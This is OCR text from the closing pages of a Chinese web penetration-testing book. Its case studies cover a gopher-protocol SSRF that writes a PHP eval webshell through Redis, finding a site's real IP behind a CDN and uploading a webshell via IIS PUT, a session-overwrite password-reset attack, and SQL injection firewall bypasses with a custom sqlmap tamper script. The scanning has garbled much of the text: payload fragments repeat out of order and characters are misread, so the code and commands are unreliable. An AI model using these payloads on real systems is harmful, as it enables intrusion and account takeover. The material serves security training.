cur1 -V
‘http://192.168,0.11/ssrf,php?ur1=gopher%3A%2f%2f192.168.0. 4%3A6379%2f_%2a4%250d%
25eaX246%25ed%25eaconfig%25ed%25ea%243%25ed%250aset%258d%258a%243%25ed%250ad1r%25
d%250a%2414%250d%250a%2fvar%2fwm&2fhtm1%2f%250d%250a%2a4%250d%258a%246%250d%250
aconfig%25ed&%258a%243%25ed%258aset%25ed%25ea%241e%250d%250adbf11ename258d%25ea%2
412%25ed%258awebshe11 php%250d%258a%2a3%250d%250a%243%250d%250aset%25ed%250a%248%
258d%258awebshe11%25ed%25eaX2429%25ed%258a111%253C%253Fphp%252e@eva1%2528%2524_P0
ST%255Ba%2550%2529%2538%252e%253F%253E%250d%250a%2a1%25ed%250a%244%250d%250asaVe%
258d%258a%25ea'
访问该链接后，就会在/var/www/html/目录下创建webshellphp，如图7-31所示。
250d%250a%246%256
d%250a%243%25
50dx250a%244%250d%250asave%250d%250a%250a
1%252
28%2524 P05T%2558a%2550%
2529%253B%2520%253F%253E%250d%250a%2a1%2
to 192.168.0.11(192.16
x258adtr%256d%250a%2414
8awebshe11.php%258d%258a%2a3%258d%258a%243%250d%250aset%258d%258a%248%250dx250a
42550%2529%2538%2520%253F%253E%250d%250a%2a1%250d%250a%244%250d%250asave%250d%25
ebshe11%250dx250a%2429%250d%250a111%253C%253Fphp%2520g
evaL%2528%2524_P05T%255Ba
Host:192.168.0.11
Accept:**
lser-Aoent:
curl/7.47:0
图7-31成功写WebShell
7.2.3
旁站攻击
笔者在对一个网站进行渗透测试时，发现网站使用了CDN加速，如果对该网站
---
## Page 408
第7章实例分析4389
发送恶意数据包，该CDN就会封禁攻击者的IP，导致无法访问该网站，如图7-32所示。
pin
185]其有32字的数据
的Ping
1.丢失=0（0失）。
以转
图7-32网站使用了CDN
其实有很多种方法可以绕过CDN寻找真实的网站IP，发现网站存在邮箱注册的
功能（在注册账户时需要验证邮箱）。所以尝试注册一个用户，然后再查看接收到的
邮件的原文，如图7-33所示。
发件人：
时间：2018年
> 9
农目人：
大
小63K
示部件原文
率1加到日历1作为用得特
图7-33显示邮件原文
从邮件原文中可以看到发件人的IP地址，如图7-34所示。
Received: fron
Nellx)vith SIIP1d
unknowm[12
4J)
by
X-QQ-FEAT:y37167t
for <
X-QQMAILINFO:NL3WE
B1Ak5gf
.Lej1
X-0Q-mid: mx!
1Sw
X-QQ-ORGSender
图7-34查看发件人的IP
般情况下，邮箱的IP和网站的IP属于同一C段，所以可以通过扫描C段IP来寻
找网站的真实IP，然后通过访间网站IP的方式绕过CDN的安全限制。注册账号后，笔
者发现可以上传头像，但是只能上传图片文件，无法上传WebShell，如图7-35所示。
---
## Page 409
390Web安全政防：渗遗测试实成指南
上传文件类型不充许
图7-35无法上传WebShell
笔者接着使用Nmap扫描网站开放的端口，发现服务器开放了8080端口，且存在
目录浏览漏洞，可以直接看到网站目录下的文件，如图7-36所示。
Indexof/Uploads
·fle
图7-36目录浏览漏洞
通过不断浏览目录下的文件，笔者发现了一个特点：8080端口是文件服务器，
在80端口上传的图片文件，其实是上传到了8080端口上，上传后的图片路径是一样
的，如图7-37和图7-38所示
图7-378080端口的文件
---
## Page 410
第7章实例分析4391
/hext
cdir class-Inner
net_flast
-h3 cless-
dlr cless-²ac[
图7-3880端口的文件
通过扫描，笔者发现8080端口存在IISPUT漏洞，可以直接上传WebShell，所以
在8080端口上上传一个PHPWebShell文件，然后就可以通过80端口访间了（8080端口
不解析PHP程序，所以不能直接通过8080端口访间）。
7.2.4重置密码
在目标用户重置个人密码时，存在多种攻击方式，本小节介绍一种常用的方式：
通过session覆盖漏洞重置他人密码。正常情况下重置密码的过程是在找回密码界面中
输入手机号，获取短信验证码，然后向服务器端提交重置密码的请求，如果输入的
短信验证码正确，密码就重置成功了，如图7-39所示。
找回密码
确认
BA号 [业登9]
图7-39重置密码的界面
---
## Page 411
392Web安全攻防：渗透测试实战指南
重置他人密码的过程如下所示。
自己的账号是18000000002，要重置的账号是18000000001。
在浏览器上打开两个TAB页面，都是重置密码的界面。
了演示，直接将短信验证码显示在界面上）按钮，如图7-40所示。
找回密码
18000000001
99947
确认
已有账号【立即登录】
图7-40获取验证码（1）
在第二个TAB页面上，输入18000000002，然后单击“获取验证码”（这里
为了演示，直接将短信验证码显示在界面上）按钮，如图7-41所示。
找回密码
18000000002
重新发送(60)
a
该置新的进
89205
确认
已有账号【立即登录】
图7-41获取验证码（2）
---
## Page 412
第7章实例分析393
回到第一个TAB页面，输入在第二个TAB页面中获取的验证码89205，接着
单击“确认”按钮，然后账号18000000001的密码就已重置成功了，如图7-42
所示。
找回密码
110000000
29)
图7-42重置了目标用户的密码
服务器端判断短信验证码是否正确的方法：判断POST传递的短信验证码和
session中传递的短信验证码是否一致，如果一致，则重置用户密码。重置密码的流程
如下所示。
。第一个TAB页面获取短信验证码时，服务器端向session中写入code=99947。
。第二个TAB页面获取短信验证码时，服务器端向session中写入code=89205。
由于两个TAB页面使用的是同一个客户端浏览器，所以第二个code值会覆
盖第一个code值。
当服务器端判断时，POST传递的code=89205，而session中code=89205，所
以通过了检测，此时利用第二个TAB页面（即发送到自己手机里）的短信
验证码成功地在第一个TAB页面重置了目标账户的密码。
7.2.5SQL注入
对一个网站进行渗透测试时，当访间id=1,id=1 and 1-1,id-1 and 1=2时，根据程
序的返回结果，可以判断该页面存在SQL注入漏洞，如图7-43~图7-45所示。
C0.16251.10/vgih
Warning: mysqi_fetch_array0 erpect
1 CphpStudyWWWuqlLphp on ine 9
图7-43访问id=1
---
## Page 413
394Web安全攻防：渗透测试实战指南
→C 192.168.251.10/sqllphp7id-1%20
test : 1111
图7-44 访问id=1 and 1=1
C 192.168.251.10/sqliphp7id=1%20a
图7-45 访问id=1 and 1=2
在使用orderby和union语句尝试注入时，笔者发现网站存在某防护软件，直接阻
断了访间，如图7-46和图7-47所示。
您所提交的调求地有不含法的参数，已被网站留理员设置过载！
图7-46使用order by语句
0192.18,251.10
图7-47使用union语句
为了寻找该防护软件的绕过方法，需要判断该软件的工作原理，具体测试步骤
如下所示。
访问id=1union，程序报错，但是语句没被拦截，如图7-48所示。
012110
图7-48访问id=1 union
访问id=1union select，语句被拦截，如图7-49所示。
图7-49 访问id=1 union select
---
## Page 414
第7章实例分析4395
说明程序不是基于关键字拦截的，而是基于关键字的组合进行判断。
访间id=1union/**/select，语句被拦截，如图7-50所示。
 192.18.251.1b/vfiphe7id
您所键交的请求害有不含法的步数，已准间站能理英设置让：
图7-50访问id=1 union/**/select
访问id=1union%26select，%26是&的url编码格式，使用&是为了检查该防
护软件是否会将1union&select拆分成1union和select，从返回结果可以看出，防
护软件果然对1union&select进行了拆分，从而导致判断出错，如图7-51所示。
O 12.166.251.10/qiphid-1%20ur
图7-51访问id=1 union%26select
访问id-1union/*%26*/select，程序报错，此时已经绕过了防护软件的检测，
如图7-52所示。
Waming mysqli,fenth amay0 epects paran
(WWnWugliphp on ine 9
图7-52 访问id=1 union/*%26*/select
访问id=1union/*%26*/select/*%26*/1,userO,3，4，页面返回了userO的结果
说明已经成功绕过了防护，如图7-53所示。
→ 192.168.30.154/qliphpid-1%20un
*%26*/select/*%26*/1,user0.3,4
root@localhost : 4
图7-53成功使用union语句
访间id=-1 union/*%26*/select/*%26*/1,table_name,3,4/*%26*/from/ *%26*/
information_schema.tables/*%26*/where/*%26*/table_schema=test', 试获取
数据库表名，但是语句被拦截，如图7-54所示。
---
## Page 415
396Web安全攻防：渗逸测试实战指南
图7-54被拦截
尝试将/*%26*/变成/*%26%23*/，%23是数据库注释符#的url编码格式，结
果成功绕过防护，如图7-55所示。
图7-55成功绕过防护
因为存在防护软件，所以在默认情况下，使用SQLMap不能获取数据，如图
7-56所示。
n tahle asisteoce chrck? [y/%/e]
110:33:57
图7-56使用SQLMAP注入
编写一个名为test.py的tamper脚本（位于SQLMap目录下的tamper目录下），
它的作用是将空格转换为/*%26%23*/，代码如下所示。
#1/usr/bin/env python
**9
---
## Page 416
第7章实例分析4397
Copyright (c) 2086-2018 sqlmap developers (http://sq1map,org/)
See the file ‘LICENSE′ for copying permission
from lib.core.enums import PRIoRITY
_prlorIty__ = PRIORITY.HIGHEST
def dependencies():
pass
def tamper(payload, **kwargs):
Replaces UNION ALL SELECT with UNION SELECT
(.313S 17 NIN t-.)adu <<<
‘-1 UNION SELECT'
return payload.replace(*, */*%26x23*/*) if payload else payload
然后使用SQLMap进行注入，语句如下所示。
python sq1map-py -u "http://192.168.251.10/ sq11.php?id=1* --tamper=test
利用该tamper即可成功获取数据，如图7-57所示。
图7-57利用tamper获取数据
---
## Page 417
反侵权盗版声明
电子工业出版社依法对本作品享有专有出版权。任何未经权利人书面许
可，复制、销售或通过信息网络传播本作品的行为：歪曲、纂改、窃本作
品的行为，均违反《中华人民共和国著作权法》，其行为人应承担相应的民
事责任和行政责任，构成犯罪的，将被依法追究刑事责任。
为了维护市场秩序，保护权利人的合法权益，我社将依法查处和打击侵
权盗版的单位和个人。欢迎社会各界人士积极举报侵权盗版行为，本社将奖
励举报有功人员，并保证举报人的信息不被泄露。
举报电话：（010）88254396：（010）88258888
传真：（010）88254397
E-mail:PI:EMAIL
通信地址：北京市万寿路173信箱
电子工业出版社总编办公室
邮编：100036
---
## Page 419
Broadview
博文视点·IT出版旗舰品牌
技术凝聚实力·专业创新出版
OWASP是国内外信息安全公司在应用安全方面的
从攻击的角度学习防护是网络安全工作者真正理
主要参考依据，尤其是在Web安全方面。作为OWASP
解安全技术并快速提升实战能力的必经之路。Web应
中国北京负责人，本人很荣幸地拜读了本书的目录和一
用作为互联网服务的直接承载者和访问入口，不可避
些章节，感受到本书符合读者需求，内容生动翔实。
免地成为攻击者的首要目标。不论是网站，还是移动
本书内客从渗透测试实战出发，增加了诸多新型
App的服务器，Web安全都是其核心的风险点。本书
渗透手法，填补了国内这方面书籍的空缺。纵观诸多
系统地介绍了当前Web攻肪技术的原理和方法，既
国人编写的安全书籍，大多都是只介绍结果，从未更
专业又易于理解，非常适合Web安全管理者学习并
多地考虑过程。本书恰给从实用出发，本着务实的精
参考。
神，对环境搭建、渗透测试全阶段，以及主流工具的
周勇林
使用实例进行了介绍，是一本实用大全，读者完全可
任子行网络技术股份有限公司常务副总裁
以依据本书的案例进行深入学习。
中国网络安全产业联盟常务理事
从本书的编写风格就可以看出作者技术功底扎
实、写作思路清晰，属于典型的“谋定而后动”
我对王东亚的即象是：学习能力强。一个能够圣
持自我学习，常年如一日的人，必定在事业上有所成。
OWASP中国北京负责人
市面上写攻防的书不少，但很多内容陈旧，只介绍工
具的基本使用，很少有深入介绍温润原理的书籍。从
结合全书的章节编排和内容设计，读者可以一览
本书的内容看，作者将实战中的经验、概念以深入浅
作者著书的初衷，本书理论与实践兼备，循序渐进，
出的方式星现，带领读者进入渗透的世界。希望读者
由浅入深。除了详尽的理论知识体系，本书还提到了
喜欢这本书，并从中受益。
这几年的安全大事件、安全攻防工具、技术案例等。
Mcvoodoo
本书基于理论进行实践，又用实践深化理论，建议对
美团点评安全研究员
Web攻防感兴整的朋友学习。
程冲
未知攻，焉知防？本书通过信息收集、漏洞发现、
金山软件集团前安全负责人
漏洞利用、内网渗透、权限维持等阶段，详细介绍了
一次完整的渗透在每个阶段需要用到的技术，是对渗
如果你是初学者，已经认真看完了本书，并按照
透测试实战的总结。本书非常适合网络安全领域的初
书中案例进行了实践，恭喜你已进阶为中级渗透测试
学者学习，只有真正了解攻击手法，才能知道怎样为
工程师。当阅读第二遍时，可以重点钻研本书中介绍
企业安全建设完善的安全体系，建议安全从业者阅读
的各种绕行攻击的手法，恭喜你已进阶为高级渗透测
此书，也建议企业为研发、运维、测试、架构等技术
试工程师。当你第三遍阅读本书时，细品作者的攻击
团队采购此书。
思路，恭喜你已进阶为资深渗透测试工程师。
一尹毅（Seay、法师）
周培源
量化云安全事业部总监
360企业安全集团安服高级总监
资深企业安全顾问
上架建议：网络安全
新浪微博
博文视点Broadview
博文视点Broadview
策划编辑：
郑柳洁
责任编辑：
封面设计：徐债弟
吴海燕
定价：89.00元
---